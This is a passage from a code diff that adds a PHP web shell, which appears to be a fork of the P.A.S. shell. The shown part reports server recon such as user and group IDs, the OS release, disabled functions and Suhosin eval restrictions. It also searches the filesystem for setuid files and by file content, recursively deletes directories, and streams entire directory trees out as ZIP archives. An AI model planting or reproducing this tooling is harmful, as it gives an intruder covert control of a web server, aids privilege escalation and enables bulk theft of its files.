+				if(defined('PHP_WINDOWS_VERSION_SP_MAJOR') && PHP_WINDOWS_VERSION_SP_MAJOR > 0){
+					$r .= ' SP'.PHP_WINDOWS_VERSION_SP_MAJOR;
+					if(defined('PHP_WINDOWS_VERSION_SP_MINOR') && PHP_WINDOWS_VERSION_SP_MINOR > 0) $r .= '.'.PHP_WINDOWS_VERSION_SP_MINOR;
+				}
+			}
+		}
+		
+		if(NIX && (($v = trim(getFile('/etc/issue.net'))) !== '' || ($v = trim(getFile('/etc/issue'))) !== '')) $r .= ' ('.$v.')';
+		
+		if($h)
+			echo escHTML($r);
+		else
+			jsonEcho($r);
+		
+		if(!empty($_SERVER['SERVER_SOFTWARE'])){
+			echo $h ?'</td></tr><tr><th>' : ',"','Server', $h ? '</th><td>':'":';
+			if($h)
+				echo escHTML($_SERVER['SERVER_SOFTWARE']);
+			else
+				jsonEcho($_SERVER['SERVER_SOFTWARE']);
+		}
+		
+		echo $h ? '</td></tr><tr><th>' : ',"','Software', $h ? '</th><td>' : '":';
+		
+		$r = 'PHP/'.PHP_VERSION;
+		
+		if(defined('SUHOSIN_PATCH_VERSION')) $r .= ' with Suhosin patch/'.SUHOSIN_PATCH_VERSION;
+		
+		$r .= '; ';
+		if(defined('CURLE_OK')){
+			$r .= 'cURL';
+			$v = curl_version();
+			if(isset($v['version'])) $r.='/'.$v['version'];
+			$r.='; ';
+		}
+		
+		if($v = phpversion('Suhosin')) $r.=' Suhosin/'.$v;
+		
+		if($h)
+			echo escHTML($r);
+		else
+			jsonEcho($r);
+			
+		echo $h ? '</td></tr><tr><th>' : ',"','User', $h ? '</th><td>' : '":';
+		
+		$r='';
+		$a = array();
+		if(NIX){
+			if(defined('POSIX_F_OK') || function_exists('posix_geteuid')){
+				if(is_int($v = posix_geteuid())) $r .= 'euid='.$v.'('.uName($v).'); ';
+				if(is_int($v = posix_getegid())) $r .= 'egid='.$v.'('.gName($v).'); ';
+			}
+			
+			if(is_int($v = getmyuid())) $r .= 'ouid='.$v.'('.uName($v).'); ';
+			if(is_int($v = getmygid())) $r .= 'ogid='.$v.'('.gName($v).'); ';
+		}
+		
+		$b = FALSE;
+		
+		foreach(array('REMOTE_ADDR','HTTP_X_REAL_IP','HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR') as $i){
+			if(!empty($_SERVER[$i])){
+				if($b)
+					$r.= ', ';
+				else{
+					$b = TRUE;
+					$r .= 'IP: ';
+				}
+				
+				$r .= $_SERVER[$i];
+			}
+		}
+		
+		if($b)
+			$r .= ';';
+		if($h)
+			echo escHTML($r);
+		else
+			jsonEcho($r);
+		
+		echo $h ? '</td></tr><tr><th colspan="2"></th></tr><tr><th>':'},{"','Safe mode', $h ? '</th><td>' : '":';
+		
+		if(isINI('safe_mode')){
+			$v = isINI('safe_mode_gid') ? 'GID':'UID';
+			echo $h ? $v : '"'.$v.'"';
+			foreach(array('Include dir' => 'safe_mode_include_dir','Exec dir' => 'safe_mode_exec_dir', 'Vars prefixes' => 'safe_mode_allowed_env_vars', 'Protected vars' => 'safe_mode_protected_env_vars') as $k => $v){
+				if(!getINI($v, $v)) $v = '-';
+				
+				echo $h ? '</td></tr><tr><th>' : ',"', $k, $h?'</th><td>' : '":';
+				if($h)
+					echo escHTML($v);
+				else
+					jsonEcho($v);
+			}
+		}
+		else
+			echo $h ? '-' : '"-"';
+		
+		echo $h ? '</td></tr>' : '';
+		foreach(array('Open basedir' => 'open_basedir', 'Disabled functions' => 'disable_functions', 'Disabled classes' => 'disable_classes') as $k => $v){
+			if(!getINI($v, $v)) $v = '-';
+			echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
+			if($h)
+				echo escHTML($v),'</td></tr>';
+			else
+				jsonEcho($v);}
+			
+			if(getINI('suhosin.simulation', $v)){
+				echo $h ? '<tr><th colspan="2"></th></tr><tr><th>' : '},{"', 'Suhosin mode', $h ? '</th><td>' : '":"', $v ? 'simulation' : 'break', $h ? '</td></tr><tr><th>' : '","','Allow rewrite', $h ? '</th><td>' : '":';
+				
+			if(!getINI('suhosin.perdir', $v) || !$v) $v = '-';
+			
+			if($h)
+				echo escHTML($v),'</td></tr>';
+			else jsonEcho($v);
+			
+			foreach(array('Functions whitelist' => 'suhosin.executor.func.whitelist', 'Functions blacklist' => 'suhosin.executor.func.blacklist', 'Eval whitelist' => 'suhosin.executor.eval.whitelist', 'Eval blacklist' => 'suhosin.executor.eval.blacklist') as $k => $v){
+				if(!getINI($v, $v)) $v = '-';
+				echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
+				if($h)
+					echo escHTML($v),'</td></tr>';
+				else jsonEcho($v);
+			}
+			
+			$a = array('eval' => 'suhosin.executor.disable_eval', '/e modifier' => 'suhosin.executor.disable_emodifier');
+			
+			$i = array();
+			foreach($a as$k => $v)
+				if(isINI($v)) $i[] = $k;
+				echo $h ? '<tr><th>' : ',"', 'Disabled', $h ?'</th><td>' : '":"', $i ? implode(', ', $i) : '-', $h ? '</td></tr>' : '"';
+				if(isINI('suhosin.log.file') && getINI('suhosin.log.file.name', $v)){
+					echo $h ? '<tr><th>' : ',"','Log file', $h ? '</th><td>' : '":';
+					if($h)
+						echo escHTML($v),'</td></tr>';
+					else
+						jsonEcho($v);
+				}
+		}
+		
+	echo $h ? '</table>' : '}]';
+}
+
+
+function parsePath($p, &$b, &$n){
+	$v = rtrim($p, DSC);
+	$i = strrpos($v,DSC);
+	if($i === FALSE){
+		if(!NIX && strlen($v) === 2 && $v[1] === ':'){
+			$b = $v.DSC;
+			$n = '';
+		}
+		else{
+			$b = DSC;
+			$n = $v;
+		}
+	}
+	else{
+		$b = substr($v,0,$i+1);
+		$n = substr($v,$i+1);
+	}
+}
+
+
+class FileInfo{
+	
+	function __construct($v){
+		if(is_string($v)){
+			$this->fb = '';
+			$this->fn= '' ;
+			
+			parsePath($v, $this->fb, $this->fn);
+			$this->fp = $this->fb.$this->fn;
+		}
+		else{
+			$this->fi = $v;
+			$this->fp = $v->getPathName();
+			$this->fb = $v->getPath();
+			$this->fn = $v->getFileName();
+		}
+		
+		$this->rp = $this->fp;
+		if($this->isLink()){
+			$this->rp = $this->getLinkTarget();
+			if(isset($this->t)) unset($this->t);
+			if(isset($this->fi)) unset($this->fi);
+		}
+	}
+	
+	function getPath(){
+		return$this->fb;
+	}
+	
+	function getFileName(){
+		return$this->fn;
+	}
+	
+	function getPathName(){
+		return$this->fp;
+	}
+	
+	function isDir(){
+		if(isset($this->d)) return$this->d;
+		if(!isset($this->p)) $this->getPerms();
+		if($this->p !== 0){
+			$this->d = ($this->p & 0170000) === 0040000;
+			return $this->d;
+		}
+		if(!isset($this->t)) $this->type();
+		if($this->t !== FALSE){
+			$this->d = $this->t === 'dir';
+			return $this->d;
+		}
+		
+		$v = is_dir($this->fp);
+		if(is_bool($v)){
+			$this->d = $v;
+			return $v;
+		}
+		if(PHP_VERSION>='5') : if(!isset($this->fi)) $this->spl();
+		if($this->fi !== FALSE){
+			try{
+				$v = $this->fi->isDir();
+			}
+			catch(Exception $e){
+				$v = NULL;
+			}
+			if(is_bool($v)){
+				$this->d = $v;
+				return $v;
+			}
+		}
+		endif;
+		$this->d = FALSE;
+		
+		return FALSE;
+	}
+	
+	function isLink() {
+	    if (isset($this->l))
+	        return $this->l;
+	    
+	    $v = lstat($this->fp);
+	    
+	    if (is_array($v)) {
+	        $this->l = ($v[2] & 0170000) === 0120000;
+	        return $this->l;
+	    }
+	    if (!isset($this->t))
+	        $this->type();
+	    if ($this->t !== FALSE) {
+	        $this->l = $this->t === 'link';
+	        return $this->l;
+	    }
+	    $v = is_link($this->fp);
+	    if (is_bool($v)) {
+	        $this->l = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->isLink();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_bool($v)) {
+	                $this->l = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->l = FALSE;
+	    return FALSE;
+	}
+	
+	function getLinkTarget() {
+	    if (isset($this->f))
+	        return $this->f;
+	    if (NIX || PHP_VERSION >= '5.3') {
+	        $v = readlink($this->fp);
+	        if (is_string($v)) {
+	            $this->f = $v;
+	            return $v;
+	        }
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getLinkTarget();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_string($v)) {
+	                $this->f = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $v = realpath($this->fp);
+	    if (is_string($v)) {
+	        $this->f = $v;
+	        return $v;
+	    }
+	    $this->f = '';
+	    return '';
+	}
+	
+	function getSize() {
+	    if (isset($this->s))
+	        return $this->s;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->s = $this->i[7];
+	        return $this->s;
+	    }
+	    $v = filesize($this->fp);
+	    if (is_int($v)) {
+	        $this->s = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getSize();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->s = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->s = -1;
+	    return -1;
+	}
+	
+	function getCTime() {
+	    if (isset($this->c))
+	        return $this->c;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->c = $this->i[10];
+	        return $this->c;
+	    }
+	    $v = filectime($this->fp);
+	    if (is_int($v)) {
+	        $this->c = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getCTime();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->c = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->c = 0;
+	    return 0;
+	}
+	
+	function getMTime() {
+	    if (isset($this->m))
+	        return $this->m;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->m = $this->i[9];
+	        return $this->m;
+	    }
+	    $v = filemtime($this->fp);
+	    if (is_int($v)) {
+	        $this->m = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getMTime();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->m = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->m = 0;
+	    return 0;
+	}
+	
+	function getOwner() {
+	    if (isset($this->o))
+	        return $this->o;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->o = $this->i[4];
+	        return $this->o;
+	    }
+	    $v = fileowner($this->fp);
+	    if (is_int($v)) {
+	        $this->o = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getOwner();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->o = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->o = -1;
+	    return -1;
+	}
+	
+	function getGroup() {
+	    if (isset($this->g))
+	        return $this->g;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->g = $this->i[5];
+	        return $this->g;
+	    }
+	    $v = filegroup($this->fp);
+	    if (is_int($v)) {
+	        $this->g = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getGroup();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->g = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->g = -1;
+	    return -1;
+	}
+	
+	function getPerms() {
+	    if (isset($this->p))
+	        return $this->p;
+	    if (!isset($this->i))
+	        $this->stat();
+	    if ($this->i !== FALSE) {
+	        $this->p = $this->i[2];
+	        return $this->p;
+	    }
+	    $v = fileperms($this->fp);
+	    if (is_int($v)) {
+	        $this->p = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->getPerms();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_int($v)) {
+	                $this->p = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->p = 0;
+	    return 0;
+	}
+	
+	function isReadable() {
+	    if (isset($this->r))
+	        return $this->r;
+	    $v = is_readable($this->fp);
+	    if (is_bool($v)) {
+	        $this->r = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->isReadable();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_bool($v)) {
+	                $this->r = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->r = FALSE;
+	    return FALSE;
+	}
+	
+	function isWritable() {
+	    if (isset($this->w))
+	        return $this->w;
+	    $v = is_writable($this->fp);
+	    if (is_bool($v)) {
+	        $this->w = $v;
+	        return $v;
+	    }
+	    if (PHP_VERSION >= '5'):
+	        if (!isset($this->fi))
+	            $this->spl();
+	        if ($this->fi !== FALSE) {
+	            try {
+	                $v = $this->fi->isWritable();
+	            }
+	            catch (Exception $e) {
+	                $v = NULL;
+	            }
+	            if (is_bool($v)) {
+	                $this->w = $v;
+	                return $v;
+	            }
+	        }
+	    endif;
+	    $this->w = FALSE;
+	    return FALSE;
+	}
+	
+	function getMode() {
+	    $v = 0;
+	    if ($this->isReadable())
+	        $v += 1;
+	    if ($this->isWritable())
+	        $v += 2;
+	    return $v;
+	}
+	
+	function stat() {
+	    $v = stat($this->fp);
+	    if (is_array($v)) {
+	        $this->i = $v;
+	        return;
+	    }
+	    $v       = lstat($this->fp);
+	    $this->i = is_array($v) ? $v : FALSE;
+	}
+	
+	function type() {
+	    $v       = filetype($this->rp);
+	    $this->t = $v ? $v : FALSE;
+	}
+	
+	function spl() {
+	    $this->fi = FALSE;
+	    if (PHP_VERSION >= '5'):
+	        if (PHP_VERSION >= '5.1.2') {
+	            try {
+	                $this->fi = new SplFileInfo($this->rp);
+	            }
+	            catch (Exception $e) {
+	                $this->fi = FALSE;
+	            }
+	        }
+	    endif;
+	}
+	
+}
+
+
+if(isset($D['a'])){
+	
+	class PZIP {
+	    var $_bpl = '', $_cdfh = NULL, $_cdfp = NULL, $_cdfo = FALSE, $_cdrc = 0, $_cdso = 0, $_flrs = array();
+	    function init($bp='') {
+	        $this->_bpl = strlen($bp);
+	        if ($h = tmpfile())
+	            $this->_cdfh = $h;
+	        else {
+	            $n = tempName();
+	            $a = array(
+	                'upload_tmp_dir',
+	                'session.save_path',
+	                'user_dir',
+	                'doc_root'
+	            );
+	            foreach ($a as $v)
+	                if ($p = ini_get($v)) {
+	                    $p .= DSC . $n;
+	                    if ($h = fopen($p, 'bw+')) {
+	                        flock($h, LOCK_EX);
+	                        $this->_cdfh = $h;
+	                        $this->_cdfp = $p;
+	                        return TRUE;
+	                    }
+	                    if (PHP_VERSION >= '5'):
+	                        if (PHP_VERSION >= '5.1') {
+	                            try {
+	                                $h = new SplFileObject($p, 'bw+');
+	                            }
+	                            catch (Exception $e) {
+	                                $h = NULL;
+	                            }
+	                            if ($h) {
+	                                $h->flock(LOCK_EX);
+	                                $this->_cdfh = $h;
+	                                $this->_cdfp = $p;
+	                                $this->_cdfo = TRUE;
+	                                return TRUE;
+	                            }
+	                        }
+	                    endif;
+	                }
+	            $p = selfPath() . $n;
+	            if ($h = fopen($p, 'bw+')) {
+	                flock($h, LOCK_EX);
+	                $this->_cdfh = $h;
+	                $this->_cdfp = $p;
+	                return TRUE;
+	            }
+	            if (PHP_VERSION >= '5'):
+	                if (PHP_VERSION >= '5.1') {
+	                    try {
+	                        $h = new SplFileObject($p, 'bw+');
+	                    }
+	                    catch (Exception $e) {
+	                        $h = NULL;
+	                    }
+	                    if ($h) {
+	                        $h->flock(LOCK_EX);
+	                        $this->_cdfh = $h;
+	                        $this->_cdfp = $p;
+	                        $this->_cdfo = TRUE;
+	                        return TRUE;
+	                    }
+	                }
+	            endif;
+	        }
+	        return FALSE;
+	    }
+	    function fileHeader($n, $t) {
+	        echo "\x50\x4b\x03\x04\x14\x00\x08\x00\x00\x00", $t, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", pack('v', strlen($n)), "\x00\x00", $n;
+	        ob_start('zipCalc', 1048576);
+	    }
+	    function fileFooter($n, $t) {
+	        ob_end_flush();
+	        $v = zipCalc(NULL);
+	        $s = pack('V', $v[0]);
+	        $c = pack('V', $v[1] ^ 0xffffffff);
+	        echo "\x50\x4b\x07\x08", $c, $s, $s;
+	        $fh   = $this->_cdfh;
+	        $nl   = strlen($n);
+	        $data = "\x50\x4b\x01\x02\x00\x00\x14\x00\x08\x00\x00\x00" . $t . $c . $s . $s . pack('v', $nl) . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . pack('V', $this->_cdso) . $n;
+	        if ($this->_cdfo) {
+	            $fh->fwrite($data);
+	            $fh->fflush();
+	        } else {
+	            fwrite($fh, $data);
+	            fflush($fh);
+	        }
+	        ++$this->_cdrc;
+	        $this->_cdso += 46 + $v[0] + $nl;
+	    }
+	    function addPath($p) {
+	        $f = new FileInfo($p);
+	        if ($f->isDir()) {
+	            if (substr($p, -1) !== DSC)
+	                $p .= DSC;
+	            $f = NULL;
+	            if (!dirRead($p, array(
+	                &$this,
+	                'addPath'
+	            )))
+	                $this->_flrs[] = substr($p, $this->_bpl);
+	        } else {
+	            $t = packTime($f->getMTime());
+	            $f = substr($p, $this->_bpl);
+	            if (!NIX)
+	                $f = str_replace(DSC, '/', $f);
+	            $this->fileHeader($f, $t);
+	            if (!outFile($p))
+	                $this->_flrs[] = $f;
+	            $this->fileFooter($f, $t);
+	        }
+	    }
+	    function close() {
+	        if (count($this->_flrs) > 0) {
+	            $n = 'CANT_READ.txt';
+	            $t = packTime(time());
+	            $this->fileHeader($n, $t);
+	            foreach ($this->_flrs as $v)
+	                echo $v, "\n";
+	            $this->fileFooter($n, $t);
+	        }
+	        $fh = $this->_cdfh;
+	        if ($this->_cdfo) {
+	            $s = $fh->ftell();
+	            $fh->fseek(0);
+	            if (!is_int($fh->fpassthru()))
+	                while (!$fh->eof())
+	                    echo $fh->fread(1048576);
+	            $fh->flock(LOCK_UN);
+	            unset($fh, $this->_cdfh);
+	        } else {
+	            $s = ftell($fh);
+	            fseek($fh, 0);
+	            if (!is_int(fpassthru($fh)))
+	                while (!feof($fh))
+	                    echo fread($fh, 1048576);
+	            flock($fh, LOCK_UN);
+	            fclose($fh);
+	        }
+	        if ($this->_cdfp !== NULL)
+	            delFile($this->_cdfp);
+	        $v = pack('v', $this->_cdrc);
+	        $c = 'Archived by P.A.S. Fork v. ' . VER;
+	        echo "\x50\x4b\x05\x06\x00\x00\x00\x00", $v, $v, pack('V', $s), pack('V', $this->_cdso), pack('v', strlen($c)), $c;
+	        sDie();
+	    }
+}
+	
+function packTime($v) {
+    $v = getdate($v);
+    return pack('vv', (($v['hours'] << 11) + ($v['minutes'] << 5) + $v['seconds'] >> 1), ((($v['year'] - 1980) << 9) + ($v['mon'] << 5) + $v['mday']));
+}
+
+if (!defined('PHP_INT_MAX'))
+    define('PHP_INT_MAX', intval('10000000000000000000'));
+    
+function zipCalc($buff) {
+    static $crcTbl = NULL, $chrTbl = NULL, $dataSize = 0, $crcSum = 0xffffffff, $shftFix = 0;
+    if ($crcTbl === NULL) {
+        $shftFix = PHP_INT_MAX >> 0;
+        for ($i = 0; $i < 256; ++$i) {
+            $v = $i;
+            for ($j = 8; $j; --$j)
+                $v = $v & 1 ? $v >> 1 & $shftFix ^ 0xEDB88320 : $v >> 1 & $shftFix;
+            $crcTbl[]        = $v;
+            $chrTbl[chr($i)] = $i;
+        }
+        $shftFix = PHP_INT_MAX >> 7;
+    } elseif ($buff === NULL) {
+        $v        = array(
+            $dataSize,
+            $crcSum
+        );
+        $dataSize = 0;
+        $crcSum   = 0xffffffff;
+        return $v;
+    }
+    $c = strlen($buff);
+    $dataSize += $c;
+    for ($i = 0; $i < $c; ++$i)
+        $crcSum = $crcTbl[$crcSum & 0xFF ^ $chrTbl[$buff[$i]]] ^ $crcSum >> 8 & $shftFix;
+    return $buff;
+}
+
+function jsonEcho($v) {
+    static $s = NULL, $r = NULL;
+    if ($s === NULL) {
+        $s = array(
+            '\\',
+            '"'
+        );
+        $r = array(
+            '\u005c',
+            '\u0022'
+        );
+        for ($i = 0; $i <= 0x1F; ++$i) {
+            $s[] = chr($i);
+            $r[] = sprintf('\u00%02s', dechex($i));
+        }
+    }
+    echo $v === NULL ? '"NULL"' : '"' . str_replace($s, $r, $v) . '"';
+}
+
+switch ($D['a']) {
+    case 'f':
+        function testProp($a, $v) {
+            foreach ($a as $i)
+                if (is_array($i)) {
+                    if (count($i) === 2) {
+                        if ($v > $i[0] && $v < $i[1])
+                            return TRUE;
+                    } elseif (isset($i[0])) {
+                        if ($v > $i[0])
+                            return TRUE;
+                    } elseif ($v < $i[1])
+                        return TRUE;
+                } elseif ($v === $i)
+                    return TRUE;
+            return FALSE;
+        }
+        class Searcher {
+            var $f, $d, $p, $a;
+            function __construct($v) {
+                echo '{"f":[';
+                $this->f = $v;
+                $this->d = 0;
+                $this->p = NULL;
+                $this->a = array();
+            }
+            function filter($v) {
+                $i = new FileInfo($v);
+                $k = $i->getFileName();
+                $f = $this->f;
+                if ($k === '.' || $k === '..')
+                    return;
+                if ($i->isLink() && !isset($f['l']))
+                    return;
+                $b = $i->isDir();
+                if ($b && (!isset($f['d']) || $f['d'] > $this->d))
+                    $this->a[] = $v;
+                if (isset($f['y']) && ($f['y'] === 1 ? !$b : $b))
+                    return;
+                if (isset($f['p']) && $i->getMode() < $f['p'])
+                    return;
+                if (!$b && isset($f['u']) && ($i->getPerms() & 0007000) !== 0004000)
+                    return;
+                if (isset($f['n'])) {
+                    if ($k !== $f['n'])
+                        return;
+                } elseif (isset($f['i'])) {
+                    if (strcasecmp($k, $f['i']) !== 0)
+                        return;
+                } elseif (isset($f['r'])) {
+                    if (!preg_match($f['r'], $k))
+                        return;
+                }
+                if (isset($f['o']) && !testProp($f['o'], $i->getOwner()))
+                    return;
+                if (isset($f['g']) && !testProp($f['g'], $i->getGroup()))
+                    return;
+                if (isset($f['e']) && !testProp($f['e'], $i->getCTime()))
+                    return;
+                if (isset($f['m']) && !testProp($f['m'], $i->getMTime()))
+                    return;
+                if (!$b && isset($f['z']) && !testProp($f['z'], $i->getSize()))
+                    return;
+                if (!$b && (isset($f['t']) || isset($f['v']) || isset($f['x']))) {
+                    if (!is_string($k = getFile($v)))
+                        return;
+                    if (isset($f['t'])) {
+                        if (strpos($k, $f['t']) === FALSE)
+                            return;
+                    } elseif (isset($f['v'])) {
+                        if (stristr($k, $f['v']) === FALSE)
+                            return;
+                    } elseif (!preg_match($f['x'], $k))
+                        return;
+                }
+                $k = $i->getPath();
+                if ($this->p !== $k) {
+                    if ($this->p !== NULL)
+                        echo ']},';
+                    echo '{"p":';
+                    jsonEcho($k);
+                    $this->p = $k;
+                    $k       = new FileInfo($k);
+                    echo ',"m":', $k->getMode(), ',"f":[';
+                }
+                outFileInfo($i);
+            }
+            function search($v) {
+                $this->a = array();
+                dirRead($v, array(
+                    &$this,
+                    'filter'
+                ));
+                if (!isset($this->f['d']) || $this->f['d'] > $this->d) {
+                    ++$this->d;
+                    $a = $this->a;
+                    foreach ($a as $v)
+                        $this->search($v);
+                }
+            }
+            function finish() {
+                if ($this->p !== NULL) {
+                    echo ']}]';
+                    outFileInfo(NULL, TRUE);
+                } else
+                    echo ']';
+                sDie('}');
+            }
+        }
+        function dirRead($p, $f) {
+            $b = is_string($f);
+            if (substr($p, -1) !== DSC)
+                $p .= DSC;
+            if ($v = opendir($p)) {
+                while (($i = readdir($v)) !== FALSE)
+                    if ($i !== '.' && $i !== '..')
+                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
+                closedir($v);
+                return TRUE;
+            }
+            if ($v = dir($p)) {
+                while (($i = $v->read()) !== FALSE)
+                    if ($i !== '.' && $i !== '..')
+                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
+                $v->close();
+                return TRUE;
+            }
+            if (PHP_VERSION >= '5'):
+                try {
+                    $v = new DirectoryIterator($p);
+                }
+                catch (Exception $e) {
+                    $v = FALSE;
+                }
+                if ($v) {
+                    foreach ($v as $i) {
+                        $n = $i->getFileName();
+                        if ($n !== '.' && $n !== '..')
+                            $b ? $f($i) : $f[0]->{$f[1]}($i);
+                    }
+                    unset($i, $v);
+                    return TRUE;
+                }
+                try {
+                    $v = new RecursiveDirectoryIterator($p);
+                }
+                catch (Exception $e) {
+                    $v = FALSE;
+                }
+                if ($v) {
+                    foreach ($v as $i)
+                        $b ? $f($i) : $f[0]->{$f[1]}($i);
+                    unset($i, $v);
+                    return TRUE;
+                }
+                if (PHP_VERSION >= '5.3') {
+                    try {
+                        $v = new FilesystemIterator($p);
+                    }
+                    catch (Exception $e) {
+                        $v = FALSE;
+                    }
+                    if ($v) {
+                        foreach ($v as $i)
+                            $b ? $f($i) : $f[0]->{$f[1]}($i);
+                        unset($i, $v);
+                        return TRUE;
+                    }
+                }
+                $v = defined('SCANDIR_SORT_NONE') ? scandir($p, SCANDIR_SORT_NONE) : scandir($p);
+                if ($v !== FALSE) {
+                    foreach ($v as $i)
+                        if ($i !== '.' && $i !== '..')
+                            $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
+                    return TRUE;
+                }
+            endif;
+            if (PHP_VERSION >= '4.3' && defined('GLOB_BRACE') && ($v = glob($p . DSC . '{,.}*', GLOB_NOESCAPE | GLOB_NOSORT | GLOB_BRACE))) {
+                foreach ($v as $i) {
+                    $n = fileName($i);
+                    if ($n !== '.' && $n !== '..')
+                        $b ? $f($i) : $f[0]->{$f[1]}($i);
+                }
+                return TRUE;
+            }
+            if (PHP_VERSION >= '5'):
+                if (PHP_VERSION >= '5.3') {
+                    try {
+                        $v = new GlobIterator($p . '*');
+                    }
+                    catch (Exception $e) {
+                        $v = FALSE;
+                    }
+                    if ($v && count($v) > 0) {
+                        foreach ($v as $i)
+                            $b ? $f($i) : $f[0]->{$f[1]}($i);
+                        unset($i, $v);
+                        return TRUE;
+                    }
+                }
+            endif;
+            return FALSE;
+        }
+        function delDir($p) {
+            dirRead($p, 'delFOD');
+            return rmdir($p);
+        }
+        function delFOD($f) {
+            $f = new FileInfo($f);
+            $n = $f->getFileName();
+            if ($n !== '.' && $n !== '..')
+                return (!$f->isLink() && $f->isDir()) ? delDir($f->getPathName()) : delFile($f->getPathName());
+        }
+        function isInt($v) {
+            return (string) $v === (string) (int) $v;
+        }
+        function jsonFileInfo($f, $b) {
+            echo '[';
+            jsonEcho($b ? $f->getPathName() : $f->getFileName());
+            echo ',', $f->isDir() ? 'null' : $f->getSize(), ',', (TM ? $f->getCTime() : $f->getMTime()), ',', $f->getMode(), ',"', $f->getPerms(), '"';
+            if (NIX) {
+                echo ',', $f->getOwner(), ',', $f->getGroup();
+                if ($b) {
+                    echo ',';
+                    jsonEcho(uName($f->getOwner()));
+                    echo ',';
+                    jsonEcho(gName($f->getGroup()));
+                }
+            }
+            if ($f->isLink()) {
+                echo ',';
+                jsonEcho($f->getLinkTarget());
+            }
+            echo ']';
+        }
+        function outFileInfo($f, $b = NULL) {
+            static $p = NULL, $o = array(), $g = array();
+            if ($b === TRUE) {
+                if (!NIX || count($o) === 0)
+                    return;
+                $b = FALSE;
+                echo ',"o":{';
+                foreach ($o as $k => $v) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    echo '"', $k, '":';
+                    jsonEcho(uName($k));
+                }
+                $b = FALSE;
+                echo '},"g":{';
+                foreach ($g as $k => $v) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    echo '"', $k, '":';
+                    jsonEcho(gName($k));
+                }
+                echo '}';
+                return;
+            }
+            if ($b === FALSE) {
+                $p = NULL;
+                return;
+            }
+            if (!isset($f->fp))
+                $f = new FileInfo($f);
+            if ($p === $f->getPath())
+                echo ',';
+            else
+                $p = $f->getPath();
+            jsonFileInfo($f, FALSE);
+            if (NIX) {
+                $o[$f->getOwner()] = 1;
+                $g[$f->getGroup()] = 1;
+            }
+        }
+        function outFile($p) {
+
+            if (preg_match('/\.gz$/i', $p)) {
+                if (is_int(readgzfile($p)))
+                    return TRUE;
+                
+                if ($v = gzopen($p)) {
+                    if (!is_int(gzpassthru($v)))
+                        while (!gzeof($v))
+                            echo gzread($v, 1048576);
+                    gzclose($v);
+                    return TRUE;
+                }
+                
+                if ($v = gzfile($p)) {
+                     if (is_array($v)) {
